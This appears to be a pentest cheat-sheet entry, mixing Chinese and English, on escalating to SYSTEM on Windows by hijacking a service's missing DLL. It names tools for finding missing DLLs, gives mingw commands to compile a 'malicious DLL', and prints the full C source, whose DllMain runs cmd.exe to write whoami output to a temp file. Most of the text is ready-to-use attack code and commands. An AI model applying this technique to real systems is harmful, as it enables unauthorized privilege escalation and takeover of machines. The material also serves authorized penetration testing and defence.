	以管理员/SYSTEM 身份运行且文件权限不正确的服务可能允许提权。可以替换文件，重新启动服务并获取系统权限。
	查找缺少的 DLL 
	- Find-PathDLLHijack PowerUp.ps1
	- Process Monitor : check for "Name Not Found"

	编译一个恶意 dll
	- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
	- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"

	windows_dll.c的内容
	#include <windows.h>
	BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
	    if (dwReason == DLL_PROCESS_ATTACH) {
	        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
	        ExitProcess(0);
	    }
	    return TRUE;
	}